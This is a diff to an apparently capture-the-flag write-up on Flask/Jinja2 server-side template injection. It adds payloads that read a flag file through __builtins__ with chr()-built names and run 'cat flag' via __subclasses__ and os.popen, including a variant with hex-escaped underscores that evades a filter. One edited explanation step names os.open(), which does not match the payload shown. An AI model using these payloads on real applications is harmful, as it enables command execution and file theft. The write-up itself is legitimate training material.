@@ -97,10 +97,26 @@
 * Here's the payload I used:
 
 ```python3
-{{ url_for.__globals__.__builtins__.open(url_for.__globals__.__builtins__.chr(102) + url_for.__globals__.__builtins__.chr(108) + url_for.__globals__.__builtins__.chr(97) + url_for.__globals__.__builtins__.chr(103)).read()}}```
+{{ url_for.__globals__.__builtins__.open(url_for.__globals__.__builtins__.chr(102) + url_for.__globals__.__builtins__.chr(108) + url_for.__globals__.__builtins__.chr(97) + url_for.__globals__.__builtins__.chr(103)).read()}}
 ```
 #### Breaking down the payload
 1. To get the chr() function, we do the same thing as before, but access the [`__builtins__` module](https://docs.python.org/3/library/builtins.html), which has many useful functions, like `open()` and `chr()`
 	1. To get a character based on any ordinal value, we can write `url_for.__globals__.__builtins__.chr(NUM)`
 2. Thus, to get the whole `flag` string, we just append all of those together
-3. Then, we use `url_for.__globals__.__bultins__.open()` and pass in the flag string to read the flag file 
+3. Then, we use `url_for.__globals__.os.open()` and pass in the flag string to read the flag file
+
+
+### Level 6
+* It looks like in this level, we can't use any underscores
+* Luckily, flask processes hex characters, so we can replace all our blocked characters with hex bytes
+	* In this case, an underscore is 0x5f
+
+* Here is the original payload along with the underscores converted to hex:
+```python3
+
+{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}
+
+{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[140]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['sys'].modules.os.popen('cat flag').read() }}
+
+
+```
